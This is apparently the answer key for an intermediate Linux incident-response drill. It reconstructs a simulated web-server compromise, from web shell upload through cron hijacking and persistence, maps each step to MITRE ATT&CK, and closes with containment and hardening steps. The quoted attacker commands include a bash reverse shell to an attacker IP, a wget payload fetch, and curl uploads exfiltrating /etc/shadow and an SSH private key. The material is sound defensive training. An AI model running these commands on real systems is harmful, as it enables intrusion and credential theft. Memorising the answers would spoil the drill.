# Solution: Drill 02 (Intermediate) — Linux Incident Response

## Answer Key

---

### Task 1: Initial Access — Web Application Exploitation

**Q1: What HTTP request delivered the initial payload?**

From nginx access log:

```text
POST /admin/upload.php HTTP/1.1  203.0.113.88  → 200 (file upload succeeded)
GET  /uploads/images/shell.php?cmd=id          → 200 47  (web shell confirmed working)
```

**Answer:** The attacker used a file upload vulnerability in `/admin/upload.php` (POST at 03:43:01).
The uploaded file `shell.php` was placed in `/uploads/images/` — an image upload directory with no file-type validation.

**Q2: Was a web shell uploaded?
If so, to which path?**

From nginx access log:

```text
GET /uploads/images/shell.php?cmd=id HTTP/1.1  → 200 47
```

**Answer:** Yes. `shell.php` was uploaded to `/var/www/html/uploads/images/shell.php`.
The web shell accepts commands via the `?cmd=` GET parameter — a classic PHP web shell.

**Q3: What was the attacker's source IP and user-agent string?**

* **Source IP**: `203.0.113.88`
* **User-Agent** (initial recon): `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` — spoofed legitimate browser
* **User-Agent** (web shell exploitation): `curl/7.88.1` — switched to curl for automated command execution

**Q4: MITRE ATT&CK technique:**

* Initial access: **T1190 — Exploit Public-Facing Application** (file upload vulnerability in admin panel)
* Web shell: **T1505.003 — Server Software Component: Web Shell**

---

### Task 2: Post-Exploitation — What Commands Were Run?

**Q1: What system enumeration commands did the attacker run as `www-data`?**

From `www-data_history` and auditd logs:

```bash
id
whoami
cat /etc/passwd
cat /etc/shadow         # failed — www-data cannot read shadow
uname -a
cat /proc/version
ps aux
ss -tnp
find / -perm -4000 -type f 2>/dev/null   # SUID enumeration
cat /var/spool/cron/crontabs/root        # cron enumeration
ls -la /opt/monitoring/                  # checking monitoring scripts
```

**Answer:** Classic Linux post-exploitation enumeration: OS info, user listing, SUID binaries, network sockets, and crucially, reading the root crontab — which revealed the misconfigured, world-writable cron script at `/opt/monitoring/health_check.sh`.

**Q2: Were any sensitive files read?**

* `/etc/passwd` — read successfully (world-readable, expected)
* `/etc/shadow` — attempted but **failed** (www-data cannot read shadow without root)
* `/var/spool/cron/crontabs/root` — **read successfully** (critical misconfiguration — crontab was world-readable)

**Q3: Was any tool downloaded?**

From auditd EXECVE and www-data_history:

```text
wget -q http://203.0.113.88/tools/linpeas.sh -O /tmp/.cache/check.sh
```

**Answer:** Yes. `linpeas.sh` (a Linux privilege escalation enumeration script) was downloaded from `203.0.113.88` and saved to `/tmp/.cache/check.sh`.
Output was captured to `/tmp/.cache/check.out`.

**Q4: Evidence of privilege escalation preparation:**

From www-data_history:

```console
cat /tmp/.cache/check.out | grep -E "SUID|writable|cron"
```

LinPEAS output revealed `/opt/monitoring/health_check.sh` was **world-writable** and executed by root via cron every 5 minutes.

---

### Task 3: Privilege Escalation — From `www-data` to `root`

**Q1: What privilege escalation technique was used?**

**Answer:** **World-writable root cron script abuse** (Cron job hijacking).
The file `/opt/monitoring/health_check.sh` had permissions `-rwxrwxrwx` (world-writable) and was executed by the `root` user via cron every 5 minutes.

The attacker overwrote it with a reverse shell payload:

```console
echo "bash -i >& /dev/tcp/203.0.113.88/4444 0>&1" > /opt/monitoring/health_check.sh
```

When cron ran this script as root at 03:47:06 (confirmed in syslog), the attacker received a root reverse shell.

**Q2: What specific misconfiguration was exploited?**

Two misconfigurations combined:

1. `/opt/monitoring/health_check.sh` was **world-writable** (chmod 777)
1. The root crontab ran the script unconditionally, with no integrity check

Additionally: `www-data ALL=(ALL) NOPASSWD: /usr/bin/tee /opt/monitoring/*` in sudoers gave www-data a second route to overwrite files in that directory.

**Q3: GTFOBins / technique:**

This is **cron path hijacking / world-writable cron script abuse**.
No GTFOBin needed — direct file overwrite was sufficient.

**Q4: MITRE ATT&CK technique ID:**

**T1053.003 — Scheduled Task/Job: Cron** (abusing an existing insecure cron job to execute attacker code as root)

---

### Task 4: Lateral Movement — The `deploy` Account

**Q1: How was the `deploy` account accessed?**

From auth.log:

```text
Accepted publickey for deploy from 203.0.113.88  ssh2: RSA SHA256:xK9mN2pQrT...
```

**Answer:** Via SSH public key authentication.
The key used is the **attacker's backdoor key**, which was added to `/home/deploy/.ssh/authorized_keys` after the attacker gained root access (fs_timeline confirms: `deploy authorized_keys modified at 03:48:30`).
The attacker also exfiltrated `deploy`'s original private key.

**Q2: What is in `deploy`'s SSH authorized_keys file?**

From `deploy_authorized_keys`:

```text
# Original deploy key (legitimate)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9deploy-ci@novatech.internal
# Backdoor key added by attacker
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kali@attack-box
```

**Answer:** Two keys are present.
The second key (`kali@attack-box`) is the attacker's backdoor — the comment directly identifies it as attacker-controlled.

**Q3: What commands did the deploy account run?**

From `deploy_history` and auth.log:

```console
sudo systemctl status nginx
sudo systemctl restart nginx
ls -la /var/www/html/uploads/images/   # reviewing web shell location
ls -la /tmp/.cache/                     # reviewing attacker tooling
cat /tmp/.cache/update.sh              # reviewing persistence payload
sudo su -                              # escalated to root
```

**Q4: Was data exfiltrated?**

From auditd logs (executed as root before deploy SSH login):

```text
cat /etc/shadow > /tmp/.cache/shadow_bak && curl -s -F 'file=@/tmp/.cache/shadow_bak' http://203.0.113.88/upload
cat /home/deploy/.ssh/id_rsa > /tmp/.cache/deploy_key && curl -s -F 'file=@/tmp/.cache/deploy_key' http://203.0.113.88/upload
```

**Answer:** Yes — two files were exfiltrated:

1. `/etc/shadow` (all user password hashes) — enables offline password cracking
1. `/home/deploy/.ssh/id_rsa` (deploy's SSH private key) — enables lateral movement to other systems

---

### Task 5: Persistence Mechanisms

**Q1: Cron-based persistence:**

From root_crontab and www-data_crontab:

```text
# Root crontab (added by attacker):
*/3 * * * * /tmp/.cache/update.sh

# www-data crontab (added by attacker):
*/3 * * * * /tmp/.cache/update.sh
```

**Answer:** Two cron jobs — one for root, one for www-data — both executing `/tmp/.cache/update.sh` (reverse shell) every 3 minutes.

**Q2: Was a systemd service created?**

From `systemd_units.txt`:

```ini
[Service]
ExecStart=/tmp/.cache/update.sh
Restart=always
RestartSec=60
```

**Answer:** Yes. `/etc/systemd/system/system-update.service` was created, executing the reverse shell and restarting it every 60 seconds if killed.

**Q3: SSH backdoor keys:**

* Root: attacker key added to `/root/.ssh/authorized_keys`
* Deploy: attacker key added to `/home/deploy/.ssh/authorized_keys`

**Answer:** Backdoor SSH key (`kali@attack-box`) added to both `root` and `deploy` accounts.

**Q4: Shell profile modifications:**

From `rc_local`:

```console
/tmp/.cache/update.sh &
```

**Answer:** `/etc/rc.local` was modified to execute the reverse shell at every system boot — a fourth persistence mechanism.

---

### Task 6: Timeline Reconstruction and Report

**Complete Attack Timeline:**

| Time (UTC) | Event | MITRE ATT&CK |
|------------|-------|--------------|
| 03:41:12 | Attacker browses web app from 203.0.113.88 | T1190 |
| 03:41:58 | POST login — authentication bypass to admin panel | T1078 |
| 03:43:01 | Upload `shell.php` to `/uploads/images/` | T1505.003 |
| 03:43:22 | Test web shell: `?cmd=id` → `uid=33(www-data)` | T1059.004 |
| 03:43:45 | Read `/etc/passwd` via web shell | T1082 |
| 03:44:30 | Download `linpeas.sh` from C2 | T1105 |
| 03:45:10 | Run linpeas.sh — reveals world-writable cron script | T1082 |
| 03:47:05 | Overwrite `/opt/monitoring/health_check.sh` with reverse shell | T1053.003 |
| 03:47:06 | Root cron fires → root reverse shell established | T1053.003 |
| 03:48:00 | Write `/tmp/.cache/update.sh` (persistent payload) | T1105 |
| 03:48:05 | Add cron entries for root + www-data | T1053.003 |
| 03:48:10 | Add attacker SSH key to `/root/.ssh/authorized_keys` | T1098.004 |
| 03:48:12 | Exfiltrate `/etc/shadow` via curl POST | T1552.003 / T1048 |
| 03:48:15 | Exfiltrate `deploy` SSH private key | T1552.004 / T1048 |
| 03:48:20 | Create systemd `system-update.service` | T1543.002 |
| 03:48:25 | Modify `/etc/rc.local` | T1037.004 |
| 03:48:30 | Add backdoor key to `deploy` authorized_keys | T1098.004 |
| 03:50:14 | SSH login as `deploy` from 203.0.113.88 | T1021.004 |
| 04:02:10 | SSH login as `root` directly from 203.0.113.88 | T1021.004 |

**Q1: First malicious event:** 03:43:01 — upload of `shell.php`.

**Q2: Time from initial access to root:** ~4 minutes (03:43:01 → 03:47:06).

**Q3: Data potentially exfiltrated:**

1. `/etc/shadow` — all user password hashes
1. `/home/deploy/.ssh/id_rsa` — deploy account private key

**Q4: Immediate containment actions:**

1. Isolate `web-prod-03` from network; block `203.0.113.88` at firewall
1. Kill the reverse shell process connecting to `203.0.113.88:4444`
1. Remove all attacker persistence: delete attacker cron entries, systemd service, rc.local entry, SSH backdoor keys
1. Rotate all credentials — regenerate deploy SSH keypair; change all user passwords (shadow was exfiltrated)
1. Take a forensic snapshot before remediation; preserve logs

**Q5: Hardening recommendations:**

1. **File permissions** — audit and fix world-writable files, especially those executed by root: `chmod 700 /opt/monitoring/*.sh; chown root:root /opt/monitoring/*.sh`
1. **Web upload validation** — enforce file type validation; deny PHP execution in upload directories via nginx: `location ~* /uploads/.*\.php { deny all; }`
1. **Cron hardening** — cron scripts run as root must be owned by root and not world-writable; monitor `/etc/cron*` for changes via auditd
1. **auditd monitoring** — alert on writes to `/root/.ssh/`, `/home/*/.ssh/`, cron files, and systemd unit directories
1. **Least privilege** — remove `NOPASSWD` from www-data sudoers entirely; deploy should not be able to `sudo su -`; use SSH certificate-based auth with short TTLs

---

## MITRE ATT&CK Summary

| ID | Technique | Observed |
|----|-----------|---------|
| T1190 | Exploit Public-Facing Application | File upload vulnerability in admin panel |
| T1505.003 | Server Software Component: Web Shell | `shell.php` uploaded and executed |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Commands via web shell |
| T1082 | System Information Discovery | linpeas, /etc/passwd, ps, ss enumeration |
| T1105 | Ingress Tool Transfer | linpeas.sh and payloads downloaded from C2 |
| T1053.003 | Scheduled Task/Job: Cron | World-writable root cron script hijacked |
| T1543.002 | Create or Modify System Process: Systemd | `system-update.service` created |
| T1037.004 | Boot or Logon Initialization Scripts: RC Scripts | `/etc/rc.local` modified |
| T1098.004 | Account Manipulation: SSH Authorized Keys | Backdoor key added to root + deploy |
| T1552.003 | Unsecured Credentials: Bash History | shadow file accessible and exfiltrated |
| T1552.004 | Unsecured Credentials: Private Keys | deploy SSH private key stolen |
| T1021.004 | Remote Services: SSH | Lateral/persistent access via SSH keys |
| T1048 | Exfiltration Over Alternative Protocol | curl POST to attacker server |
